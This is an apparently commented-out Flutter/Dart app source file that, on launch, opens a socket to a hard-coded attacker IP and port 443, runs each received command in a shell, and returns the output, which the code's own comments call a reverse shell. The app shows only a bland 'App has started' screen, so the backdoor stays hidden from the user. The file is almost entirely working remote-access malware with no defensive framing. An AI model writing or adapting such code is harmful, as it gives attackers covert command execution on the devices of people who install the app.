// import 'dart:io';
// import 'package:flutter/material.dart';

// void main() => runApp(MyApp());

// class MyApp extends StatefulWidget {
//   @override
//   _MyAppState createState() => _MyAppState();
// }

// class _MyAppState extends State<MyApp> {
//   final String serverIp = '192.168.86.26'; // Your IP attacker
//   final int serverPort = 443; // Port Attacker

//   @override
//   void initState() {
//     super.initState();
//     _connectToServer();
//   }

//   void _connectToServer() {
//     Socket.connect(serverIp, serverPort).then((socket) {
//       print('Connection successful');

//       // Listen data from server
//       socket.listen(
//         (data) {
//           final command = String.fromCharCodes(data).trim();
//           print('Command Received From Server: $command');

//           // Reverse Shell
//           Process.run(command, [], runInShell: true).then((result) {
//             final output = result.stdout;
//             socket.write(output);
//           }).catchError((error) {
//             socket.write('Error command: $error');
//           });
//         },
//         onDone: () {
//           print('Close connection with server.');
//           socket.destroy();
//         },
//         onError: (error) {
//           print('Error: $error');
//           socket.destroy();
//         },
//       );
//     }).catchError((error) {
//       print('Error connect server: $error');
//     });
//   }

//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       home: Scaffold(
//         appBar: AppBar(
//           title: Text('Startup Socket Connection'),
//         ),
//         body: Center(
//           child: Text('App has started'),
//         ),
//       ),
//     );
//   }
// }
